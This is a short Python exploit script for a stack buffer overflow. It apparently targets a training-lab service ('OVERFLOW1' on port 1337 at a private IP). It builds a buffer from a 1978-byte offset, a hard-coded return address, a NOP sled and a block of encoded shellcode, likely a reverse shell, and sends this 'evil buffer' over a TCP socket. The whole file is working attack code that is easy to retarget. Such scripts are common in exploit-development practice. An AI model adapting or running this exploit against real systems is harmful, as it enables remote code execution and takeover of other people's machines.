import socket

ip = "10.10.158.108"
port = 1337

prefix = "OVERFLOW1 "
offset = 1978
overflow = "A" * offset
retn = "\xaf\x11\x50\x62"
padding = "\x90"*16
postfix = ""
payload = ("\xdb\xd7\xba\x77\x1b\x5d\xf8\xd9\x74\x24\xf4\x5f\x31\xc9\xb1"
"\x52\x31\x57\x17\x83\xef\xfc\x03\x20\x08\xbf\x0d\x32\xc6\xbd"
"\xee\xca\x17\xa2\x67\x2f\x26\xe2\x1c\x24\x19\xd2\x57\x68\x96"
"\x99\x3a\x98\x2d\xef\x92\xaf\x86\x5a\xc5\x9e\x17\xf6\x35\x81"
"\x9b\x05\x6a\x61\xa5\xc5\x7f\x60\xe2\x38\x8d\x30\xbb\x37\x20"
"\xa4\xc8\x02\xf9\x4f\x82\x83\x79\xac\x53\xa5\xa8\x63\xef\xfc"
"\x6a\x82\x3c\x75\x23\x9c\x21\xb0\xfd\x17\x91\x4e\xfc\xf1\xeb"
"\xaf\x53\x3c\xc4\x5d\xad\x79\xe3\xbd\xd8\x73\x17\x43\xdb\x40"
"\x65\x9f\x6e\x52\xcd\x54\xc8\xbe\xef\xb9\x8f\x35\xe3\x76\xdb"
"\x11\xe0\x89\x08\x2a\x1c\x01\xaf\xfc\x94\x51\x94\xd8\xfd\x02"
"\xb5\x79\x58\xe4\xca\x99\x03\x59\x6f\xd2\xae\x8e\x02\xb9\xa6"
"\x63\x2f\x41\x37\xec\x38\x32\x05\xb3\x92\xdc\x25\x3c\x3d\x1b"
"\x49\x17\xf9\xb3\xb4\x98\xfa\x9a\x72\xcc\xaa\xb4\x53\x6d\x21"
"\x44\x5b\xb8\xe6\x14\xf3\x13\x47\xc4\xb3\xc3\x2f\x0e\x3c\x3b"
"\x4f\x31\x96\x54\xfa\xc8\x71\x51\xf3\x0d\x9b\x0d\x01\xb1\x8d"
"\x91\x8c\x57\xc7\x39\xd9\xc0\x70\xa3\x40\x9a\xe1\x2c\x5f\xe7"
"\x22\xa6\x6c\x18\xec\x4f\x18\x0a\x99\xbf\x57\x70\x0c\xbf\x4d"
"\x1c\xd2\x52\x0a\xdc\x9d\x4e\x85\x8b\xca\xa1\xdc\x59\xe7\x98"
"\x76\x7f\xfa\x7d\xb0\x3b\x21\xbe\x3f\xc2\xa4\xfa\x1b\xd4\x70"
"\x02\x20\x80\x2c\x55\xfe\x7e\x8b\x0f\xb0\x28\x45\xe3\x1a\xbc"
"\x10\xcf\x9c\xba\x1c\x1a\x6b\x22\xac\xf3\x2a\x5d\x01\x94\xba"
"\x26\x7f\x04\x44\xfd\x3b\x24\xa7\xd7\x31\xcd\x7e\xb2\xfb\x90"
"\x80\x69\x3f\xad\x02\x9b\xc0\x4a\x1a\xee\xc5\x17\x9c\x03\xb4"
"\x08\x49\x23\x6b\x28\x58")

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
